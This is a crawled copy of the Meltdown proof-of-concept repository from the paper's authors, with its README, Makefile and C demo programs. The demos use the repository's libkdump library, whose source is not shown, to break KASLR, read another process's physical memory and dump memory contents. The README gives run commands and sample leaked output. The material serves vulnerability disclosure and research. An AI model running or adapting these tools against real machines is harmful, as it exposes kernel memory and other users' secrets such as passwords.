{
  "metadata": {
    "timestamp": 1736709709829,
    "page": 93,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjEwMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "IAIK/meltdown",
      "stars": 4123,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.0791015625,
          "content": "kaslr\nmemdump\nmemory_filler\nphysical_reader\nreliability\nsecret\ntest\n*.a\n*.o\n*.so\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 0.8408203125,
          "content": "Copyright (c) 2018 meltdown\n\nThis software is provided 'as-is', without any express or implied\nwarranty. In no event will the authors be held liable for any damages\narising from the use of this software.\n\nPermission is granted to anyone to use this software for any purpose,\nincluding commercial applications, and to alter it and redistribute it\nfreely, subject to the following restrictions:\n\n   1. The origin of this software must not be misrepresented; you must not\n   claim that you wrote the original software. If you use this software\n   in a product, an acknowledgment in the product documentation would be\n   appreciated but is not required.\n\n   2. Altered source versions must be plainly marked as such, and must not be\n   misrepresented as being the original software.\n\n   3. This notice may not be removed or altered from any source\n   distribution.\n"
        },
        {
          "name": "Makefile",
          "type": "blob",
          "size": 0.3798828125,
          "content": "override CFLAGS += -O3 -pthread -Wno-attributes -m64\nCC=gcc\n\n#BINARIES=test kaslr physical_reader\n\nSOURCES := $(wildcard *.c)\nBINARIES := $(SOURCES:%.c=%)\n\nall: $(BINARIES)\n\nlibkdump/libkdump.a:  libkdump/libkdump.c\n\tmake -C libkdump\n\n%: %.c libkdump/libkdump.a\n\t$(CC) $< -o $@ -m64 -Llibkdump -Ilibkdump -lkdump -static $(CFLAGS)\n\t\n\t\nclean:\n\trm -f *.o $(BINARIES)\n\tmake clean -C libkdump\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 12.048828125,
          "content": "# Meltdown Proof-of-Concept\n\nThis repository contains several applications, demonstrating the [Meltdown bug](https://meltdownattack.com). For technical information about the bug, refer to the paper: \n\n* [Meltdown](https://meltdownattack.com/meltdown.pdf) by Lipp, Schwarz, Gruss, Prescher, Haas, Mangard, Kocher, Genkin, Yarom, and Hamburg\n\nThe applications in this repository are built with [libkdump](https://github.com/IAIK/Meltdown/tree/master/libkdump), a library we developed for the paper. This library simplifies exploitation of the bug by automatically adapting to certain properties of the environment. \n\n## Videos\n\nThis repository contains several videos demonstrating Meltdown\n\n * [Video #1](https://cdn.rawgit.com/IAIK/meltdown/master/videos/spy.mp4) shows how Meltdown can be used to spy in realtime on a password input. \n * [Video #2](https://cdn.rawgit.com/IAIK/meltdown/master/videos/memdump.mp4) shows how Meltdown leaks physical memory content. \n * [Video #3](https://cdn.rawgit.com/IAIK/meltdown/master/videos/cat1.mp4) shows how Meltdown reconstructs a photo from memory. \n * [Video #4](https://cdn.rawgit.com/IAIK/meltdown/master/videos/cat2.mp4) shows how Meltdown reconstructs a photo from memory which is encoded with the FLIF file format. \n * [Video #5](https://cdn.rawgit.com/IAIK/meltdown/master/videos/uncached.mp4) shows how Meltdown leaks uncached memory. \n\n## Demos\n\nThis repository contains five demos to demonstrate different use cases. All demos are tested on Ubuntu 16.04 with an Intel Core i7-6700K, but they should work on any Linux system with any modern Intel CPU since 2010. \n\nFor best results, we recommend a fast CPU that supports Intel TSX (e.g. any Intel Core i7-5xxx, i7-6xxx, or i7-7xxx). \nFurthermore, every demo should be pinned to one CPU core, e.g. with taskset.\n\n### Build dependency for demos\nAs a pre-requisite, you need to install glibc-static on your machine.\n\nFor RPM-based systems:\n```\nsudo yum install -y glibc-static\n```\n\n### Demo #1: A first test (`test`)\n\nThis is the most basic demo. It uses Meltdown to read accessible addresses from the own address space, not breaking any isolation mechanisms. \n\nIf this demo does not work for you, the remaining demos most likely won't work either. The reasons are manifold, e.g., the CPU could be too slow, not support out-of-order execution, the high-resolution timer is not precise enough (especially in VMs), the operating system does not support custom signal handlers, etc.\n\n#### Build and Run\n\n```bash\nmake\ntaskset 0x1 ./test\n```\n\nIf you see an output similar to this\n```\nExpect: Welcome to the wonderful world of microarchitectural attacks\n   Got: Welcome to the wonderful world of microarchitectural attacks\n```\nthen the basic demo works.\n\n\n### Demo #2: Breaking KASLR (`kaslr`)\n\nStarting with Linux kernel 4.12, KASLR (Kernel Address Space Layout Randomizaton) is active by default.  This means, that the location of the kernel (and also the direct physical map which maps the entire physical memory) changes with each reboot.\n\nThis demo uses Meltdown to leak the (secret) randomization of the direct physical map. This demo requires root privileges to speed up the process. The paper describes a variant which does not require root privileges. \n\n#### Build and Run\n\n```bash\nmake\nsudo taskset 0x1 ./kaslr\n```\n\nAfter a few seconds, you should see something similar to this\n```\n[+] Direct physical map offset: 0xffff880000000000\n```\n\n### Demo #3: Reliability test (`reliability`)\n\nThis demo tests how reliable physical memory can be read. For this demo, you either need the direct physical map offset (e.g. from demo #2) or you have to disable KASLR by specifying `nokaslr` in your kernel command line. \n\n#### Build and Run\n\nBuild and start `reliability`. If you have KASLR enabled, the first parameter is the offset of the direct physical map. Otherwise, the program does not require a parameter. \n```bash\nmake\nsudo taskset 0x1 ./reliability 0xffff880000000000\n```\n\nAfter a few seconds, you should get an output similar to this:\n```\n[-] Success rate: 99.93% (read 1354 values)\n```\n\n### Demo #4: Read physical memory (`physical_reader`)\n\nThis demo reads memory from a different process by directly reading physical memory. For this demo, you either need the direct physical map offset (e.g. from demo #2) or you have to disable KASLR by specifying `nokaslr` in your kernel command line. \n\nIn principal, this program can read arbitrary physical addresses. However, as the physical memory contains a lot of non-human-readable data, we provide a test tool (`secret`), which puts a human-readable string into memory and directly provides the physical address of this string. \n\n#### Build and Run\n\nFor the demo, first run `secret` (as root) to get the physical address of a human-readable string:\n```bash\nmake\nsudo ./secret\n```\n\nIt should output something like this:\n```\n[+] Secret: If you can read this, this is really bad\n[+] Physical address of secret: 0x390fff400\n[+] Exit with Ctrl+C if you are done reading the secret\n```\n\nWhile the `secret` program is running, start `physical_reader`. The first parameter is the physical address printed by `secret`. If you do not have KASLR disabled,  the second parameter is the offset of the direct physical map.\n```bash\ntaskset 0x1 ./physical_reader 0x390fff400 0xffff880000000000\n```\n\nAfter a few seconds, you should get an output similar to this:\n```\n[+] Physical address       : 0x390fff400\n[+] Physical offset        : 0xffff880000000000\n[+] Reading virtual address: 0xffff880390fff400\n\nIf you can read this, this is really bad\n```\n\n\n### Demo #5: Dump the memory (`memdump`)\n\nThis demo dumps the content of the memory. As demo #3 and #4, it uses the direct physical map, to dump the contents of the physical memory in a hexdump-like format. \n\nAgain, as the physical memory contains a lot of non-human-readable content, we provide a test tool to fill large amounts of the physical memory with human-readable strings. \n\n#### Build and Run\n\nFor the demo, first run `memory_filler` to fill the memory with human-readable strings. The first argument is the amount of memory (in gigabytes) to fill. \n```bash\nmake\n./memory_filler 9\n```\n\nThen, run the `memdump` tool to dump memory contents. If you executed `memory_filler` before, you should see some string fragments. \nIf you have Firefox or Chrome with multiple tabs running, you might also see parts of the websites which are open or were recently closed. \n\nThe first parameter is the physical address at which the dump should begin (leave empty to start at the first gigabyte). The second parameter is the amount of bytes you want to be read, to read it all give -1. If you do not have KASLR disabled,  the third parameter is the offset of the direct physical map.\n\n```bash\ntaskset 0x1 ./memdump 0x240000000 -1 0xffff880000000000 # start at 9 GB\n```\n\nYou should get a hexdump of parts of the memory (potentially even containing secrets such as passwords, see example in the paper), e.g.:\n\n```\n 240001c9f: | 00 6d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | .m.............. |\n 24000262f: | 00 7d 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | .}.............. |\n 24000271f: | 00 00 00 00 00 00 00 00 00 00 00 00 65 6e 20 75 | ............en u |\n 24000272f: | 73 65 72 20 73 70 61 63 65 20 61 6e 64 20 6b 65 | ser space and ke |\n 24000273f: | 72 6e 65 6c 57 65 6c 63 6f 6d 65 20 74 6f 20 74 | rnelWelcome to t |\n 24000298f: | 00 61 72 79 20 62 65 74 77 65 65 6e 20 75 73 65 | .ary between use |\n 24000299f: | 72 20 73 70 61 63 65 20 61 6e 64 20 6b 65 72 6e | r space and kern |\n 2400029af: | 65 6c 42 75 72 6e 20 61 66 74 65 72 20 72 65 61 | elBurn after rea |\n 2400029bf: | 64 69 6e 67 20 74 68 69 73 20 73 74 72 69 6e 67 | ding this string |\n 240002dcf: | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c8 | ................ |\n 2400038af: | 6a 75 73 74 20 73 70 69 65 64 20 6f 6e 20 61 00 | just spied on a. |\n 240003c8f: | 00 00 1e 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ |\n 24000412f: | 00 00 00 00 00 00 00 00 00 00 00 00 65 74 73 2e | ............ets. |\n 24000413f: | 2e 2e 57 65 6c 63 6f 6d 65 20 74 6f 20 74 68 65 | ..Welcome to the |\n 2400042ff: | 00 00 00 00 00 00 00 00 00 6e 67 72 61 74 75 6c | .........ngratul |\n 24000430f: | 61 74 69 6f 6e 73 2c 20 79 6f 75 20 6a 75 73 74 | ations, you just |\n 24000431f: | 20 73 70 69 65 64 20 6f 6e 20 61 6e 20 61 70 70 |  spied on an app |\n```\n\n## Frequently Asked Questions\n\n* **Does it work on Windows / Ubuntu on Windows (WSL) / Mac OS?**\n\n    No. This PoC only works on Linux, as it uses properties specific to the Linux kernel, such as the direct physical map. \n\n* **Can I run the PoC in a virtual machine?**\n\n    Yes, the PoC also works on virtual machines. However, due to the additional layer introduced by a virtual machine, it might not work as good as on native hardware. \n\n* **The KASLR program (`kaslr`) does not find the offset!**\n\n    The `kaslr` tool only does very few measurements to be fast. If it does not find the offset, there are two possibilities:\n    \n    * change the number of retries in `kaslr.c`: `config.retries = 1000;`\n    * use the kernel module in `kaslr_offset` to directly read the offset from the kernel. Install the kernel headers for your kernel (```sudo apt-get install linux-headers-`uname -r` ```) and run `sudo ./direct_physical_map.sh`\n\n* **You said it works on uncached memory, but all your demos ensure that the memory is cached!**\n\n    Making it work on uncached memory is trickier, and often requires a bit of tweaking of the parameters. Thus, we ensure that the memory is cached in the PoC to make it easier to reproduce. However, you can simply remove the code that caches the values and replace it by a `clflush` to test the exploit on uncached memory (see Video #5 for an example).\n    Although not in the original blog post by Google, this was also confirmed by independent researchers (e.g. [Alex Ionescu](https://twitter.com/aionescu/status/951261470343360513), [Raphael Carvalho](https://twitter.com/raphael_scarv/status/952078140028964864), [Pavel Boldin](https://www.youtube.com/watch?v=EMBGXswJC4s)).\n\n* **It just does not work on my computer, what can I do?**\n\n    There can be a lot of different reasons for that. We collected a few things you can try:\n    \n    * Ensure that your CPU frequency is at the maximum, and frequency scaling is disabled.\n    * If you run it on a mobile device (e.g., a laptop), ensure that it is plugged in to get the best performance.\n    * Try to pin the tools to a specific CPU core (e.g. with taskset). Also try different cores and core combinations.\n    * Vary the load on your computer. On some machines it works better if the load is higher, on others it works better if the load is lower.\n    * Try to disable hyperthreading in the BIOS. On some computers it works a lot better if hyperthreading is disabled.\n    * Use a different variant of Meltdown. This can be changed in `libkdump/libkdump.c` in the line `#define MELTDOWN meltdown_nonull`. Try for example `meltdown` instead of `meltdown_nonull`, which works a lot better on some machines (but not at all on others). \n    * Try to create many interrupts, e.g. by running the tool `stress` with `stress -i 2` (or other values for the `i` parameter, depending on the number of cores).\n    * Try to restart the demos and also your computer. Especially after a standby, the timing are broken on some computers. \n    * Play around with the parameters of libkdump, e.g. increase the number of retries and/or measurements. \n\n\n## Warnings\n**Warning #1**: We are providing this code as-is. You are responsible for protecting yourself, your property and data, and others from any risks caused by this code. This code may cause unexpected and undesirable behavior to occur on your machine. This code may not detect the vulnerability on your machine.\n\n**Warning #2**: If you find that a computer is susceptible to the Meltdown bug, you may want to avoid using it as a multi-user system. Meltdown breaches the CPU's memory protection. On a machine that is susceptible to the Meltdown bug, one process can read all pages used by other processes or by the kernel.\n\n**Warning #3**: This code is only for testing purposes. Do not run it on any productive systems. Do not run it on any system that might be used by another person or entity.\n"
        },
        {
          "name": "kaslr.c",
          "type": "blob",
          "size": 1.361328125,
          "content": "#include \"libkdump.h\"\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(int argc, char *argv[]) {\n  size_t scratch[4096];\n  libkdump_config_t config;\n  size_t offset = DEFAULT_PHYSICAL_OFFSET;\n#ifdef __x86_64__\n  size_t step = 0x800000000ll;\n#else\n  size_t step = 0x1000000;\n#endif\n  size_t delta = -2 * step;\n  int progress = 0;\n\n  libkdump_enable_debug(0);\n\n  config = libkdump_get_autoconfig();\n  config.retries = 10;\n  config.measurements = 1;\n\n  libkdump_init(config);\n\n  size_t var = (size_t)(scratch + 2048);\n  *(char *)var = 'X';\n\n  size_t start = libkdump_virt_to_phys(var);\n  if (!start) {\n    printf(\"\\x1b[31;1m[!]\\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\\n\");\n    exit(1);\n  }\n\n  while (1) {\n    *(volatile char *)var = 'X';\n    *(volatile char *)var = 'X';\n    *(volatile char *)var = 'X';\n    *(volatile char *)var = 'X';\n    *(volatile char *)var = 'X';\n\n    int res = libkdump_read(start + offset + delta);\n    if (res == 'X') {\n      printf(\"\\r\\x1b[32;1m[+]\\x1b[0m Direct physical map offset: \\x1b[33;1m0x%zx\\x1b[0m\\n\", offset + delta);\n      fflush(stdout);\n      break;\n    } else {\n      delta += step;\n      if (delta >= -1ull - offset) {\n        delta = 0;\n        step >>= 4;\n      }\n      printf(\"\\r\\x1b[34;1m[%c]\\x1b[0m 0x%zx    \", \"/-\\\\|\"[(progress++ / 400) % 4], offset + delta);\n    }\n  }\n\n  libkdump_cleanup();\n\n  return 0;\n}\n"
        },
        {
          "name": "kaslr_offset",
          "type": "tree",
          "content": null
        },
        {
          "name": "libkdump",
          "type": "tree",
          "content": null
        },
        {
          "name": "memdump.c",
          "type": "blob",
          "size": 2.0625,
          "content": "#include \"libkdump.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <signal.h>\n\nstatic int running = 1;\n\nvoid sigint(int signum __attribute__((unused))) {\n  running = 0;\n}\n\nint main(int argc, char *argv[]) {\n  size_t phys = 1ull * 1024ull * 1024ull * 1024ull; // start at first gigabyte\n  size_t size = (size_t)-1ULL;\n  if (argc >= 2) {\n    phys = strtoull(argv[1], NULL, 0);\n  }\n  if (argc >= 3) {\n    size = strtoull(argv[2], NULL, 0);\n  }\n\n  int width = 16; // characters per line\n  int suppress_empty = 1;\n\n  libkdump_config_t config;\n  config = libkdump_get_autoconfig();\n  config.retries = 10;\n  config.measurements = 2;\n  if (argc >= 4) {\n    config.physical_offset = strtoull(argv[3], NULL, 0);\n  }\n\n  libkdump_init(config);\n\n  size_t vaddr = libkdump_phys_to_virt(phys);\n\n  if (vaddr == -1ULL) {\n    fprintf(stderr, \"Error converting physical to virtual address\\n\");\n    return -1;\n  }\n\n  printf(\n      \"\\x1b[32;1m[+]\\x1b[0m Physical address       : \\x1b[33;1m0x%zx\\x1b[0m\\n\", phys);\n  printf(\"\\x1b[32;1m[+]\\x1b[0m Physical offset        : \\x1b[33;1m0x%zx\\x1b[0m\\n\", config.physical_offset);\n  printf(\n      \"\\x1b[32;1m[+]\\x1b[0m Virtual address       : \\x1b[33;1m0x%zx\\x1b[0m\\n\", vaddr);\n\n  if (width > size)\n     width = size;\n\n  size_t delta = 0;\n  int i;\n  char *buffer = malloc(width);\n\n  signal(SIGINT, sigint);\n\n  while (running && delta < size) {\n    int value = libkdump_read(vaddr + delta);\n    buffer[delta % width] = value;\n\n    if (delta % width == width - 1) {\n      int skip = 1;\n      for (i = 0; i < width; i++) {\n        if (buffer[i]) {\n          skip = 0;\n          break;\n        }\n      }\n      if (skip && suppress_empty) {\n        delta++;\n        continue;\n      }\n\n      printf(\"%10zx: \", delta + phys - (width - 1));\n      printf(\"| \");\n      for (i = 0; i < width; i++) {\n        printf(\"%02x \", (unsigned char)buffer[i]);\n      }\n      printf(\"| \");\n      for (i = 0; i < width; i++) {\n        printf(\"%c\", (buffer[i] >= 32 && buffer[i] <= 126) ? buffer[i] : '.');\n      }\n      printf(\" |\\n\");\n    }\n    delta++;\n  }\n\n  free(buffer);\n  libkdump_cleanup();\n\n  return 0;\n}\n"
        },
        {
          "name": "memory_filler.c",
          "type": "blob",
          "size": 1.6328125,
          "content": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nconst char *strings[] = {\n    \"If you can read this, this is really bad\",\n    \"Burn after reading this string, it is a secret string\",\n    \"Congratulations, you just spied on an application\",\n    \"Wow, you broke the security boundary between user space and kernel\",\n    \"Welcome to the wonderful world of microarchitectural attacks\",\n    \"Please wait while we steal your secrets...\",\n    \"Don't panic... But your CPU is broken and your data is not safe\",\n    \"How can you read this? You should not read this!\"};\n\nint main(int argc, char *argv[]) {\n  if (argc != 2) {\n    printf(\"Usage: %s <gigabytes to fill>\\n\", argv[0]);\n    return 0;\n  }\n\n  size_t size = strtoull(argv[1], NULL, 0);\n  if (!size) {\n    printf(\"\\x1b[31;1m[!]\\x1b[0m Invalid size!\\n\");\n    return 1;\n  }\n\n  size_t bytesize = size * 1024ull * 1024ull * 1024ull;\n  char *memory = malloc(bytesize);\n  if (!memory) {\n    printf(\"\\x1b[31;1m[!]\\x1b[0m Could not allocate %zd GB memory, try less!\\n\", size);\n    return 1;\n  }\n\n  int lens[sizeof(strings) / sizeof(strings[0])];\n  int i;\n  for (i = 0; i < sizeof(strings) / sizeof(strings[0]); i++) {\n    lens[i] = strlen(strings[i]);\n  }\n\n  size_t pos = 0;\n  while (pos < bytesize) {\n    int string_index = rand() % (sizeof(strings) / sizeof(strings[0]));\n    if (lens[string_index] + pos < bytesize) {\n      memcpy(memory + pos, strings[string_index], lens[string_index]);\n      pos += lens[string_index];\n    } else {\n      break;\n    }\n  }\n\n  printf(\"\\x1b[32;1m[+]\\x1b[0m Press any key if you are done reading the secret\\n\");\n  getchar();\n  printf(\"\\x1b[32;1m[+]\\x1b[0m Done!\\n\");\n\n  free(memory);\n}\n"
        },
        {
          "name": "physical_reader.c",
          "type": "blob",
          "size": 0.9072265625,
          "content": "#include \"libkdump.h\"\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(int argc, char *argv[]) {\n  size_t phys;\n  if (argc < 2) {\n    printf(\"Usage: %s <physical address> [<direct physical map>]\\n\", argv[0]);\n    return 0;\n  }\n\n  phys = strtoull(argv[1], NULL, 0);\n\n  libkdump_config_t config;\n  config = libkdump_get_autoconfig();\n  if (argc > 2) {\n    config.physical_offset = strtoull(argv[2], NULL, 0);\n  }\n\n  libkdump_init(config);\n\n  size_t vaddr = libkdump_phys_to_virt(phys);\n\n  printf(\"\\x1b[32;1m[+]\\x1b[0m Physical address       : \\x1b[33;1m0x%zx\\x1b[0m\\n\", phys);\n  printf(\"\\x1b[32;1m[+]\\x1b[0m Physical offset        : \\x1b[33;1m0x%zx\\x1b[0m\\n\", config.physical_offset);\n  printf(\"\\x1b[32;1m[+]\\x1b[0m Reading virtual address: \\x1b[33;1m0x%zx\\x1b[0m\\n\\n\", vaddr);\n\n  while (1) {\n    int value = libkdump_read(vaddr);\n    printf(\"%c\", value);\n    fflush(stdout);\n    vaddr++;\n  }\n\n  libkdump_cleanup();\n\n  return 0;\n}\n"
        },
        {
          "name": "reliability.c",
          "type": "blob",
          "size": 1.5380859375,
          "content": "#include \"libkdump.h\"\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nint main(int argc, char *argv[]) {\n  size_t scratch[4096];\n  libkdump_config_t config;\n  size_t offset = DEFAULT_PHYSICAL_OFFSET;\n  int progress = 0;\n  unsigned char secret = 'X';\n\n  if(argc == 2) {\n    offset = strtoull(argv[1], NULL, 0);\n    printf(\"\\x1b[33;1m[+]\\x1b[0m Setting physical offset to 0x%zx\\n\", offset);\n  }\n  \n  libkdump_enable_debug(0);\n\n  config = libkdump_get_autoconfig();\n  config.retries = 10;\n  config.measurements = 2;\n  config.physical_offset = offset;\n\n  libkdump_init(config);\n\n  size_t var = (size_t)(scratch + 2048);\n  *(char*)var = secret;\n\n  size_t start = libkdump_virt_to_phys(var);\n  if (!start) {\n    printf(\"\\x1b[31;1m[!]\\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\\n\");\n    exit(1);\n  }\n  \n  srand(time(NULL));\n\n  size_t correct = 0, wrong = 0, failcounter = 0;\n  size_t phys = libkdump_phys_to_virt(start);\n  while (1) {\n    *(volatile unsigned char*)var = secret;\n\n    int res = libkdump_read(phys);\n    if (res == secret) {\n      correct++;\n    } else if(res != 0) {\n      wrong++;\n    } else {\n      failcounter++;\n      if(failcounter < 1000) {\n        continue;\n      } else {\n        failcounter = 0;\n        wrong++;\n      }\n    }\n    printf(\"\\r\\x1b[34;1m[%c]\\x1b[0m Success rate: %.2f%% (read %zd values)    \", \"/-\\\\|\"[(progress++ / 100) % 4], (100.f * (double)correct) / (double)(correct + wrong), correct + wrong);\n    fflush(stdout);\n    secret = (rand() % 255) + 1;\n  }\n\n  libkdump_cleanup();\n\n  return 0;\n}\n"
        },
        {
          "name": "secret.c",
          "type": "blob",
          "size": 1.568359375,
          "content": "#include \"libkdump.h\"\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\n\nconst char *strings[] = {\n    \"If you can read this, this is really bad\",\n    \"Burn after reading this string, it is a secret string\",\n    \"Congratulations, you just spied on an application\",\n    \"Wow, you broke the security boundary between user space and kernel\",\n    \"Welcome to the wonderful world of microarchitectural attacks\",\n    \"Please wait while we steal your secrets...\",\n    \"Don't panic... But your CPU is broken and your data is not safe\",\n    \"How can you read this? You should not read this!\"};\n\nint main(int argc, char *argv[]) {\n  libkdump_config_t config;\n  config = libkdump_get_autoconfig();\n  libkdump_init(config);\n\n  srand(time(NULL));\n  const char *secret = strings[rand() % (sizeof(strings) / sizeof(strings[0]))];\n  int len = strlen(secret);\n\n  printf(\"\\x1b[32;1m[+]\\x1b[0m Secret: \\x1b[33;1m%s\\x1b[0m\\n\", secret);\n\n  size_t paddr = libkdump_virt_to_phys((size_t)secret);\n  if (!paddr) {\n    printf(\"\\x1b[31;1m[!]\\x1b[0m Program requires root privileges (or read access to /proc/<pid>/pagemap)!\\n\");\n    libkdump_cleanup();\n    exit(1);\n  }\n\n  printf(\"\\x1b[32;1m[+]\\x1b[0m Physical address of secret: \\x1b[32;1m0x%zx\\x1b[0m\\n\", paddr);\n  printf(\"\\x1b[32;1m[+]\\x1b[0m Exit with \\x1b[37;1mCtrl+C\\x1b[0m if you are done reading the secret\\n\");\n  while (1) {\n    // keep string cached for better results\n    volatile size_t dummy = 0, i;\n    for (i = 0; i < len; i++) {\n      dummy += secret[i];\n    }\n    sched_yield();\n  }\n\n  libkdump_cleanup();\n\n  return 0;\n}\n"
        },
        {
          "name": "test.c",
          "type": "blob",
          "size": 1.22265625,
          "content": "#include \"libkdump.h\"\n#include <ctype.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\n\nconst char *strings[] = {\n    \"If you can read this, at least the auto configuration is working\",\n    \"Generating witty test message...\",\n    \"Go ahead with the real exploit if you dare\",\n    \"Have a good day.\",\n    \"Welcome to the wonderful world of microarchitectural attacks\",\n    \"Pay no attention to the content of this string\",\n    \"Please wait while we steal your secrets...\",\n    \"Would you like fries with that?\",\n    \"(insert random quote here)\",\n    \"Don't panic...\",\n    \"Wait, do you smell something burning?\",\n    \"How did you get here?\"};\n\nint main(int argc, char *argv[]) {\n  libkdump_config_t config;\n  config = libkdump_get_autoconfig();\n  libkdump_init(config);\n\n  srand(time(NULL));\n  const char *test = strings[rand() % (sizeof(strings) / sizeof(strings[0]))];\n  int index = 0;\n\n  printf(\"Expect: \\x1b[32;1m%s\\x1b[0m\\n\", test);\n  printf(\"   Got: \\x1b[33;1m\");\n  while (index < strlen(test)) {\n    int value = libkdump_read((size_t)(test + index));\n    if (!isprint(value))\n      continue;\n    printf(\"%c\", value);\n    fflush(stdout);\n    index++;\n  }\n\n  printf(\"\\x1b[0m\\n\");\n  libkdump_cleanup();\n\n  return 0;\n}\n"
        },
        {
          "name": "videos",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}